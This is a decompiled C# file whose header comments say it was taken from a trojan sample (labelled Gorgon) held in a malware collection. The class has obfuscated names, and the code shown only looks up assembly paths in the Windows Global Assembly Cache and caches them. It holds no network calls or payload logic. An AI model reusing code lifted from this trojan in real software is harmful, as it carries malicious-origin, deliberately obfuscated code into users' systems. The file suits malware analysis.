// Decompiled with JetBrains decompiler
// Type: qCz28SP.6Di2BYV
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using kU6afx4;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace qCz28SP
{
  internal static class \u0036Di2BYV
  {
    private const int \u0031s3oNQJ = 512;
    private static readonly object ccqbM51 = new object();
    private static readonly Dictionary<string, string> c2Zvies = new Dictionary<string, string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);

    internal static bool OoV4Vfu(string W6GVpR4, ProcessorArchitecture HuckNSV, out string _param2)
    {
      if (HuckNSV != ProcessorArchitecture.None && W6GVpR4.IndexOf(", processorArchitecture=", StringComparison.OrdinalIgnoreCase) < 0)
        W6GVpR4 += string.Format((IFormatProvider) CultureInfo.InvariantCulture, ", processorArchitecture={0}", (object) HuckNSV);
      lock (\u0036Di2BYV.ccqbM51)
      {
        if (\u0036Di2BYV.c2Zvies.ContainsKey(W6GVpR4))
        {
          _param2 = \u0036Di2BYV.c2Zvies[W6GVpR4];
          return _param2 != null;
        }
      }
      YFDZWc8.\u0039JXx1pZ assemblyInfo = new YFDZWc8.\u0039JXx1pZ()
      {
        cFTrbXD = 512
      } with
      {
        H4myO46 = new string(char.MinValue, 512)
      };
      YFDZWc8.IAssemblyCache assemblyCache;
      Marshal.ThrowExceptionForHR(YFDZWc8.lKJ9eBQ(out assemblyCache, 0));
      try
      {
        if (assemblyCache.QueryAssemblyInfo(1, W6GVpR4, ref assemblyInfo) != 0)
        {
          lock (\u0036Di2BYV.ccqbM51)
            \u0036Di2BYV.c2Zvies[W6GVpR4] = (string) null;
          _param2 = (string) null;
          return false;
        }
        _param2 = assemblyInfo.H4myO46;
        lock (\u0036Di2BYV.ccqbM51)
          \u0036Di2BYV.c2Zvies[W6GVpR4] = _param2;
        return true;
      }
      catch (FileNotFoundException ex)
      {
        lock (\u0036Di2BYV.ccqbM51)
          \u0036Di2BYV.c2Zvies[W6GVpR4] = (string) null;
        _param2 = (string) null;
        return false;
      }
    }
  }
}
